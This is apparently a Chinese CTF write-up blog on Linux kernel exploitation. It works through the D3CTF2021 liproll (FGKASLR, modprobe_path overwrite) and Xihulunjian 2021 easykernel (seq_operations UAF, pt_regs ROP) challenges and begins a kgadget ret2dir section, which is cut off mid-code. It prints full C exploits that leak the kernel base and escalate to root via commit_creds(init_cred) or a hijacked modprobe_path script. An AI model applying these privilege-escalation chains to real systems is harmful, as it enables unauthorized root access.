<h2 id="从D3CTF2021-liproll学习FGKASLR"><a href="#从D3CTF2021-liproll学习FGKASLR" class="headerlink" title="从D3CTF2021 liproll学习FGKASLR"></a>从D3CTF2021 liproll学习FGKASLR</h2><p>可以根据<a target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/archives/829/">wjh师傅</a>的这篇博客来学习一下FGKASLR以及内核的其他防护。</p>
<blockquote>
<p>FGKASLR 在 KASLR 基地址随机化的基础上，在加载时刻，以函数粒度重新排布内核代码。</p>
</blockquote>
<p>大概意思就是有些函数的偏移不再是固定的偏移，因此确定内核基址比较困难。但是还是有一部分节区或者gadget没有被细粒度随机化，所以可以多泄露几次内存，比较泄露两次内存中后三位不发生改变的内核地址，通过这个地址泄露内核基地址，并且modprobe_path的地址不会被随机化，所以用modprobe的利用手法比较简单。</p>
<p>首先来分析一下程序，我们可以看到这个函数中存在栈溢出，v1是我们传入的数据，没有限制大小，而v5在栈上，因此栈溢出越界写写到v6中去，在程序的最后会重新将v6赋给全局变量global_buffer，因此可以将global_buffer修改为我们想要的地址。重新调用这个函数就可以在memcpy处将我们想要的数据填入到我们想要的地址上。<br><img src="https://i.imgur.com/Q5bMSpL.png" srcset="/img/loading.gif" lazyload></p>
<p>而在这个函数中存在越界读漏洞，因为传入的a3没有限制大小<br><img src="https://i.imgur.com/XR0jhW5.png" srcset="/img/loading.gif" lazyload></p>
<p>因此我们的思路是通过越界读确定内核基址，然后将global_buffer改为modprobe_path的地址，然后再修改modprobe_path的值为我们写的脚本，执行未知格式文件即可执行我们写的脚本。</p>
<p>常规查看modprobe_path的思路是<br><img src="https://i.imgur.com/vN8vOyv.png" srcset="/img/loading.gif" lazyload><br>但是有些内核没有modprobe_path的符号可以通过__request_module函数找到其地址，通过cmp这一行可以确定modprobe_path的地址<br><img src="https://i.imgur.com/yy63buw.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://i.imgur.com/bDOvNwG.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://i.imgur.com/hWrcv9f.png" srcset="/img/loading.gif" lazyload></p>
<p>写的exp不稳定，特别容易崩，并且还不知道如何查看是否开启FGASLR，有知道的师傅可以联系我。<br>exp</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">save_stat</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">asm</span>(<br>        <span class="hljs-string">&quot;movq %%cs, %0;&quot;</span><br>        <span class="hljs-string">&quot;movq %%ss, %1;&quot;</span><br>        <span class="hljs-string">&quot;movq %%rsp, %2;&quot;</span><br>        <span class="hljs-string">&quot;pushfq;&quot;</span><br>        <span class="hljs-string">&quot;popq %3;&quot;</span><br>        : <span class="hljs-string">&quot;=r&quot;</span> (user_cs), <span class="hljs-string">&quot;=r&quot;</span> (user_ss), <span class="hljs-string">&quot;=r&quot;</span> (user_sp), <span class="hljs-string">&quot;=r&quot;</span> (user_rflags) : : <span class="hljs-string">&quot;memory&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shell</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>	<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span>&#123;<br>	<span class="hljs-type">void</span> *buf;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len;<br>&#125;;<br><br><span class="hljs-type">int</span> fd;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(fd, <span class="hljs-number">0xd3c7f03</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">choose</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span></span>&#123;<br>    <span class="hljs-type">int</span> *idxp = &amp;idx;<br>    <span class="hljs-built_in">ioctl</span>(fd, <span class="hljs-number">0xd3c7f04</span>, idxp);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> node *nodep)</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(fd, <span class="hljs-number">0xd3c7f01</span>, nodep);<br>&#125;<br><br><span class="hljs-type">char</span> data[<span class="hljs-number">0x300</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">signal</span>(SIGSEGV, shell);<br>    <span class="hljs-built_in">save_stat</span>();<br><br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /root/flag /tmp/flag\n/bin/chmod 777 /tmp/flag\n&#x27; &gt; /tmp/chflag&quot;</span>);<br>	<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;chmod +x /tmp/chflag&quot;</span>);<br>	<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;echo -ne &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/aaa&quot;</span>);<br>	<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;chmod +x /tmp/aaa&quot;</span>);<br><br>    fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/liproll&quot;</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] bad open device\n&quot;</span>);<br>		<span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>	&#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]open drive\n&quot;</span>);<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span> node1;<br>    node1.buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    node1.len = <span class="hljs-number">0x108</span>;<br><br>    <span class="hljs-built_in">add</span>();<br>    <span class="hljs-built_in">choose</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">read</span>(fd, data, <span class="hljs-number">0x300</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Leak address: \n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x300</span>/<span class="hljs-number">8</span>;i++)&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%lx\n&quot;</span>,*((<span class="hljs-type">size_t</span> *)data+i));<br>	&#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%lx\n&quot;</span>,*((<span class="hljs-type">size_t</span> *)data+<span class="hljs-number">52</span>));<br>    <span class="hljs-type">size_t</span> kernel_base = *((<span class="hljs-type">size_t</span> *)data+<span class="hljs-number">52</span>)-(*((<span class="hljs-type">size_t</span> *)data+<span class="hljs-number">52</span>)&amp;<span class="hljs-number">0xffffff</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]kernel_base = 0x%lx\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-type">size_t</span> modprobe_path =  kernel_base+<span class="hljs-number">0xffffffff82448460</span><span class="hljs-number">-0xffffffff81000000</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]modprobe_path = 0x%lx\n&quot;</span>, modprobe_path);<br>    *((<span class="hljs-type">size_t</span> *)node1.buf+<span class="hljs-number">0x20</span>)=modprobe_path;<br>    <span class="hljs-built_in">edit</span>(&amp;node1);<br>    <span class="hljs-built_in">strcpy</span>(node1.buf, <span class="hljs-string">&quot;/tmp/chflag&quot;</span>);<br>    node1.len = <span class="hljs-number">0x10</span>;<br>    <span class="hljs-built_in">edit</span>(&amp;node1);<br><br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/tmp/aaa&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="从西湖论剑2021easykernel学习pt-regs结构体的利用"><a href="#从西湖论剑2021easykernel学习pt-regs结构体的利用" class="headerlink" title="从西湖论剑2021easykernel学习pt_regs结构体的利用"></a>从西湖论剑2021easykernel学习pt_regs结构体的利用</h2><p>linux系统调用的时候会把所有寄存器依次压入内核栈中形成pt_regs结构体。这一步是在调用syscall时的<code>entry_SYSCALL_64</code>函数来完成的。如图所示。之后各个寄存器按顺序压栈。想传什么数据（ROP）可以在用户态写汇编，这样就保存在了内核栈中。之后劫持内核流为add rsp， val；即可将内核流劫持到pt_regs结构体上，pt_regs上布置了我们要执行的ROP，因此可以getshell。<br><img src="https://i.imgur.com/WMEmrxm.png" srcset="/img/loading.gif" lazyload></p>
<p>首先来分析一下题目。是一个菜单题，有读写申请释放功能，释放时没有将指针置空，因此存在UAF漏洞（注意读写和申请释放传入的不是同一种结构体，比较坑）。最大可以申请0x20大小的对象，seq_operations结构体也是0x20大小。因此可以申请后释放，再打开stat文件，stat文件申请的就是刚刚释放的对象，此时修改刚刚释放的对象，将start函数改为add rsp， val；即可。</p>
<blockquote>
<p>当我们打开一个 stat 文件时（如 &#x2F;proc&#x2F;self&#x2F;stat ）便会在内核空间中分配一个 seq_operations 结构体，该结构体定义于 &#x2F;include&#x2F;linux&#x2F;seq_file.h 当中，只定义了四个函数指针，如下：</p>
</blockquote>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">seq_operations</span> &#123;<br>    <span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-built_in">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>    <span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-built_in">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>我们构造如下的ROP，至于为什么是swqpgs_restore_regs+8下面会提到。<br><img src="https://i.imgur.com/jvokOmj.png" srcset="/img/loading.gif" lazyload></p>
<p>首先我们一直跟syscall直到push r15处，我们可以看到r15处的rsp值为0xffffc90000217f58，然后我们跟到调用seq_operations的start函数处，看一下此时的rsp值为0xffffc90000217db8，相差0x1A0，因此我们尽量找add rsp， 0x1a0； ret的gadget，但是没有找到，因此找add rsp， 0x170的gadget，因为下面还有6个pop，因此可以实现add rsp， 0x1a0的效果。<br><img src="https://i.imgur.com/6y6OMg4.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://i.imgur.com/DPJcG3N.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://i.imgur.com/PaOwCEN.png" srcset="/img/loading.gif" lazyload></p>
<p>此时已经将内核流劫持到我们的r15寄存器的位置，也就是ROP的地方。当我们执行到swapgs_restore_regs的位置时，我们看到栈顶存放的是我们一开始传入rbp的值，这也就是为什么是swqpgs_restore_regs+8的原因。<br><img src="https://i.imgur.com/xtgV0aK.png" srcset="/img/loading.gif" lazyload></p>
<p>之后就可以getshell了。</p>
<p>exp</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_OPS 0xffffffff81319d30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82663300</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81089250</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810c8d40</span><br><br><br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> seq_fd;<br><span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">op_chunk</span> &#123;<br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">alloc_chunk</span> &#123;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">readChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span> </span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">op_chunk</span> op = &#123;.idx = idx, .size = size, .buf = buf&#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x40</span>, &amp;op);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">writeChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span> </span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">op_chunk</span> op = &#123;.idx = idx, .size = size, .buf = buf&#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x50</span>, &amp;op);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deleteChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span> </span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">op_chunk</span> op = &#123;.idx = idx&#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x30</span>, &amp;op);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">allocChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span> </span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">alloc_chunk</span> alloc = &#123;.size = size, .buf = buf&#125;;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x20</span>, &amp;alloc);<br>&#125;<br><span class="hljs-type">size_t</span> buffer[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode;<br><span class="hljs-type">size_t</span> init_cred;<br><span class="hljs-type">size_t</span> pop_rdi_ret;<br><span class="hljs-type">size_t</span> commit_creds;<br><span class="hljs-type">size_t</span> gadget;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    dev_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/kerpwn&quot;</span>, O_RDWR);<br>    <span class="hljs-built_in">allocChunk</span>(<span class="hljs-number">0x20</span>, buffer);<br>    <span class="hljs-built_in">deleteChunk</span>(<span class="hljs-number">0</span>);<br>    seq_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    <span class="hljs-built_in">readChunk</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, buffer);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] start: %p\n&quot;</span>, (<span class="hljs-type">size_t</span>) buffer[<span class="hljs-number">0</span>]);<br>    kernel_offset = buffer[<span class="hljs-number">0</span>] - SEQ_OPS;<br>    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset;<br>    init_cred = INIT_CRED + kernel_offset;<br>    pop_rdi_ret = POP_RDI_RET + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    gadget = <span class="hljs-number">0xffffffff8172c151</span> + kernel_offset;<br>    buffer[<span class="hljs-number">0</span>] = gadget;<br>    <span class="hljs-built_in">writeChunk</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, buffer);<span class="hljs-comment">//修改seq_ops-&gt;start函数</span><br>    swapgs_restore_regs_and_return_to_usermode += <span class="hljs-number">8</span>;<br>    __asm__(<br>    <span class="hljs-string">&quot;mov r15, pop_rdi_ret;&quot;</span><br>    <span class="hljs-string">&quot;mov r14, init_cred;&quot;</span><br>    <span class="hljs-string">&quot;mov r13, commit_creds;&quot;</span><br>    <span class="hljs-string">&quot;mov r12, swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>    <span class="hljs-string">&quot;mov rbp, 0x9999999999999999;&quot;</span><br>    <span class="hljs-string">&quot;mov rbx, 0x8888888888888888;&quot;</span><br>    <span class="hljs-string">&quot;mov r11, 0x7777777777777777;&quot;</span><br>    <span class="hljs-string">&quot;mov r10, 0x6666666666666666;&quot;</span><br>    <span class="hljs-string">&quot;mov r9, 0x5555555555555555;&quot;</span><br>    <span class="hljs-string">&quot;mov r8, 0x4444444444444444;&quot;</span><br>    <span class="hljs-string">&quot;xor rax, rax;&quot;</span><br>    <span class="hljs-string">&quot;mov rcx, 3333333333333333;&quot;</span><br>    <span class="hljs-string">&quot;mov rdx, 8;&quot;</span><br>    <span class="hljs-string">&quot;mov rsi, rsp;&quot;</span><br>    <span class="hljs-string">&quot;mov rdi, seq_fd;&quot;</span><br>    <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>


<h2 id="从kgadget学习ret2dir与pt-regs"><a href="#从kgadget学习ret2dir与pt-regs" class="headerlink" title="从kgadget学习ret2dir与pt_regs"></a>从kgadget学习ret2dir与pt_regs</h2><p>ret2dir也就是return to direct mapped memory,具体原理可以直接参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/3c662b6163a7">bsauce师傅</a>和<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/185408">rtfingc师傅</a>的文章。文章中有小demo，大家可以调一下。<br>笔者能力有限，如有错误，还请大佬指点。大概解释一下，通过利用一个核心区域，直接映射系统的一部分或全部物理内存（用户空间内存映射到physmap，内核可直接访问physmap），允许攻击者在内核地址空间内访问用户数据。也就是说，用户空间分配的内存，会停留在RAM中，physmap和RAM是直接的映射关系，因此在用户空间填充的数据会映射到physmap中，而内核中有一片区域，叫direct mapping of all physical memory（0xffff888000000000 - 0xffffc87fffffffff），它将physmap映射到内核的一块空间中，此时就会将刚刚用户填充的数据从physmap映射到内核中，可以绕过smep和smap。</p>
<p>直接来看题，在ioctl函数中有call rbx，而rbx又是rdx地址存放的指针，因此存在一个指针解引用，按理说我们可以直接像上一题那样把ROP布置在pt_regs中，但是题目中对[rax-A8h]到[rax-70h]进行了销毁，pt_regs的大小为0xa8，因此销毁的是r15，r14,r13,r12,rbp,rbx以及r10，因此剩下的就剩r8和r9两个寄存器可以使用，我们可以用这两个寄存器进行栈迁移。首先用户态堆喷，以页为单位申请内存并构造ROP。此时这些已经够造好ROP的内存页也会被映射到内核中的direct mapping of all physical memory中。首先我们要先执行r8和r9寄存器中的栈迁移指令，因此需要计算call rbx时rsp与r9的距离。<br><img src="https://i.imgur.com/d2fnx7k.png" srcset="/img/loading.gif" lazyload></p>
<p>可以看到，两者rsp相差0xc0，因此选择<code>add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret</code>的gadget,0xa0+4个pop。然后pop rsp之后进行栈迁移，从try_hit处一直用slide滑到ROP处，从而进行提权。为什么try_hit用0xffff888000000000+0x7000000，笔者猜0x7000000应该是一个神奇的数字。这道题exp中跳转到pt_regs的gadget和slide滑块用到的gadget是一样的，这里可能比较不好理解一点，具体可以调一下，自己调过之后会清晰很多（一定要自己调一下）。<br><img src="https://i.imgur.com/DaBNvUu.png" srcset="/img/loading.gif" lazyload></p>
<p>EXP</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 